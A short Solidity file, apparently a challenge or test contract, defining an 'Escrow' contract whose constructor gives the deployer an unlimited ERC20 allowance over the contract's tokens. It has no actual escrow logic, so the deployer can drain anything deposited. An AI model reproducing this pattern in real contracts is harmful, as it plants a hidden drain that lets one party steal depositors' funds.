// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
/*
 *     ,_,
 *    (',')
 *    {/"\}
 *    -"-"-
 */

import "@openzeppelin/token/ERC20/IERC20.sol";

contract Escrow {
	constructor(address _token) {
		IERC20(_token).approve(msg.sender, type(uint256).max);
	}
}